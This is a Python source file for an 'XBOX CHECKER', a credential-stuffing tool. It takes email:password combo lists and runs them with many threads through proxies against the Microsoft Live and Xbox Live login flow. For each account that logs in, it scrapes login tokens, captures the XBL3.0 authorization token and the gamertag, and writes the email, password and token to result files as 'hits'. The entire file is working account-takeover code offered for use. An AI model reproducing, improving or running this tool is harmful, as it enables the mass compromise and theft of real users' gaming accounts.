import requests
import uuid
from url_parser import parse_url
from urllib.parse import quote , unquote
from datetime import datetime
import os
import sys
import re
from conn import conn
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
import base64
import json
import ctypes
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import easygui
import colorama
colorama.init()
class XBOX:
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[XBOX CHECKER]--BY @BINARY_THUG|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL COMBOS:{len(lin)}")
    def dceode_return(self,base64_string):
        base64_string += "=" * ((4 - len(base64_string) % 4) % 4)
        decoded_bytes = base64.b64decode(base64_string)

        decoded_string = decoded_bytes.decode('utf-8')
        jso=json.loads(decoded_string)
        for item in jso:
            if item.get('Item1') == 'http://xboxlive.com':
                token = item['Item2']['Token']
                expiry=item['Item2']['NotAfter']
                uhs = item['Item2']['DisplayClaims']['xui'][0]['uhs']
                xid=item['Item2']['DisplayClaims']['xui'][0]['xid']
                return uhs,token,xid,expiry
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.RED+character * terminal_width+colorama.Fore.RESET)
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'XBOX CHECKER  MADE BY @BINARY_THUG') 
        text = '''    
██╗  ██╗██████╗  ██████╗ ██╗  ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
╚██╗██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚███╔╝ ██████╔╝██║   ██║ ╚███╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
 ██╔██╗ ██╔══██╗██║   ██║ ██╔██╗     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██╔╝ ██╗██████╔╝╚██████╔╝██╔╝ ██╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                         
                                                                                                                                                                                                                                           
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def convert_to_conventional(self,iso):
        truncated_iso = iso[:-4] + 'Z'
        datetime_obj = datetime.strptime(truncated_iso, "%Y-%m-%dT%H:%M:%S.%fZ")
        conventional_format = datetime_obj.strftime("%B %d, %Y, %I:%M:%S %p %Z")
        return conventional_format
    def __init__(self) -> None:
        self.glob_tr=True
        self.valid=0
        self.invalid=0
    def mk_Rq(self,emil,psd,datime,filname):
        url=f'https://sisu.xboxlive.com/connect/XboxLive?state={uuid.uuid4()}&ru=https://social.xbox.com/changegamertag'
        headers = {
    "Host": "sisu.xboxlive.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Referer": "https://social.xbox.com/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
        txter=conn((requests.get),url,headers=headers,allow_redirects=False,filesname=filname)
        if txter is None:
            self.invalid=self.invalid+1
            return None
        loc=txter.headers['Location']
        ms_cv=txter.headers['MS-CV']
        custom_headers = {
    "Host": "login.live.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://social.xbox.com/",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
        frontto=conn((requests.get),url=loc,headers=custom_headers,allow_redirects=False,filesname=filname)
        if frontto is None:
            self.invalid=self.invalid+1
            return None
        mspcook=frontto.cookies.get_dict()
        url_pattern = r"urlPost:'(.*?)'"
        urls = re.findall(url_pattern, frontto.text)
        ppft_pattern = r'name="PPFT" id="[a-zA-Z0-9]*" value="(.*?)"'
        mah = re.search(ppft_pattern, frontto.text)
        if mah:
            ppft_value = mah.group(1)
        else:
            self.invalid=self.invalid+1
            return None
        if urls:
            extracted_url = urls[0]
        else:
            self.invalid=self.invalid+1
            return None
        ppft=quote(ppft_value)
        cookiestr="; ".join([f"{name}={value}" for name, value in mspcook.items()])
        pyheaders = {
    "Host": "login.live.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"{loc}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "585",
    "Origin": "https://login.live.com",
    "Connection": "keep-alive",
    "Cookie":cookiestr,
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
        email=quote(emil)
        pswd=quote(psd)
        payload=f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pswd}"
        makima=conn((requests.post),extracted_url,data=payload,headers=pyheaders,allow_redirects=False,filesname=filname)
        if makima is None:
            self.invalid=self.invalid+1
            return None
        redead=makima.cookies.get_dict()
        if '__Host-MSAAUTH' in redead:
            pass
        else:
            self.invalid=self.invalid+1
            return None
        target=redead['__Host-MSAAUTH']
        om= re.findall(url_pattern,makima.text)
        if om:
            ext=om[0]
        else:
            self.invalid=self.invalid+1
            return None
        mspcook['__Host-MSAAUTH']=target
        cookiem="; ".join([f"{name}={value}" for name, value in mspcook.items()])
        hes = {
    "Host": "login.live.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"{extracted_url}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "264",
    "Origin": "https://login.live.com",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Cookie": cookiem,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
        pyload=f"LoginOptions=1&type=28&ctx=&hpgrequestid=&PPFT={ppft}&canary="
        try:
            denji=conn((requests.post),ext,data=pyload,headers=hes,allow_redirects=False,filesname=filname)
            if denji is None:
                self.invalid=self.invalid+1
                return None
            newloc=denji.headers['Location']
            authcookies=denji.cookies.get_dict()
        except:
            self.invalid=self.invalid+1
            return None
        headers_custom = {
    "Host": "sisu.xboxlive.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://login.live.com/",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-User": "?1",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "TE": "trailers"
}
        try:
            trajedio=conn((requests.get),newloc,headers=headers_custom,allow_redirects=False,filesname=filname)
            if trajedio is None:
                self.invalid=self.invalid+1
                return None
            locanao=trajedio.headers['Location']
            acessencrypt=str(parse_url(locanao)['fragment']).replace("state=login&accessToken=",'')
            t=acessencrypt.split("&accessToken=")[1]
            uhs,acesstoken,xid,expiry=self.dceode_return(t)
        except:
            self.invalid=self.invalid+1
            return None
        expiryu=self.convert_to_conventional(expiry)
        EXPIRYP=f"{expiryu} 24 HOURS TIME"
        hmtai=f"XBL3.0 x={uhs};{acesstoken}"
        userdata = {
    "Host": "profile.xboxlive.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "x-xbl-contract-version": "2",
    "authorization": hmtai,  
    "MS-CV": f"{ms_cv}",
    "Origin": "https://social.xbox.com",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Referer": "https://social.xbox.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
        urt=f'https://profile.xboxlive.com/users/xuid({xid})/profile/settings?settings=Gamertag,GameDisplayPicRaw,RealName,Bio,WebLayoutStyle,WebResizableBackgroundUrl,WebLayoutPosition,WebColorTheme,WebBackgroundGradient,PreferredFlag,PreferredPlatforms,DisplayedLinkedAccounts,WebActivityFeedLayout,WebPreferredGameStats,WebBackgroundType,moderngamertag,modernGamertagSuffix,UniqueModernGamertag'
        try:
            howsita=conn((requests.get),urt,headers=userdata,filesname=filname).json()['profileUsers'][0]['settings'][0]['value']
        except:
            howsita="NOTFOUND"
        if howsita is None:
            howsita="NOTFOUND"
        self.valid=self.valid+1
        output=os.path.join(datime,f"[{howsita}][{xid}].txt")
        with open(output,'w',errors='ignore',encoding='utf-8') as beleive:
            beleive.write(f"=====================================\nEMAIL:{unquote(email)}\nPASSWORD:{unquote(pswd)}\nAUTHORIZATION:{hmtai}\nEXPIRY OF AUTHORIZATION:{EXPIRYP}\nGAMERTAG:{howsita}\n==========================\n")
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def runner(self, combo, worker,filename,dat):
        print(colorama.Fore.RED+"READING COMBOS")
        lin = open(combo,errors="ignore",encoding="utf-8").readlines()
        with ThreadPoolExecutor(max_workers=worker) as executor:
            for lines in lin:
                if lines:
                    pos=lines.strip().split(":")
                    try:
                        user=pos[0]
                        pas=pos[1]
                        executor.submit(self.mk_Rq,user,pas,dat,filename)
                    except Exception as e:
                        continue
            os.system("cls")
            self.print_thread = Thread(target=self.print_stats, args=(lin,))
            self.print_thread.daemon = True 
            self.print_thread.start()
            self.ui()
            self.print_horizontal_line()
            print(self.center(colorama.Fore.RED+"CHECKER BY @BINARY_THUG"))
            print(self.center(colorama.Fore.MAGENTA+"CHECKER STARTED............"))
            print(self.center(colorama.Fore.RED+"YOU CAN MININMIZE THE WINDOWS IT WILL TAKE TIME"))
            self.print_horizontal_line()
            executor.shutdown(wait=True)
            self.glob_tr=False

def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3) 
            
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def main():
    maximize_console_window()
    Lifi=XBOX()
    Lifi.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    os.system("cls")
    if type=="1":
        combo=easygui.fileopenbox(title="XBOX CHECKER-SELECT COMBO",filetypes=["*.txt"],multiple=False)
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"COMBO LOADED ")
        PROXY=easygui.fileopenbox(title="XBOX CHECKER-SELECT PROXY HTTP ONLY",filetypes=["*.txt"],multiple=False)
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+" PROXY HTTP LOADED")
        os.system("cls")
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>50:
            os.system("cls")
            print(colorama.Fore.YELLOW+"Only 50 threads are allowed")
            thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        os.system("cls")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"COMBO LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+" PROXY HTTP LOADED")
        Lifi.runner(combo=combo,filename=PROXY,worker=int(thread_num),dat=s)
        os.system("cls")
        Lifi.ui()
        Lifi.print_horizontal_line()
        print(Lifi.center(colorama.Fore.RED+"CHECKER BY @BINARY_THUG"))
        print(Lifi.center(colorama.Fore.MAGENTA+"CHECKER ENDED............"))
        print(Lifi.center(colorama.Fore.RED+"ENJOY XBOX ACCOUNTS HITS"+colorama.Fore.RESET))
        Lifi.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[XBOX CHECKER]--BY @BINARY_THUG|VALIDS:{Lifi.valid}|INVALIDS:{Lifi.invalid}")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        sys.exit()

            

main()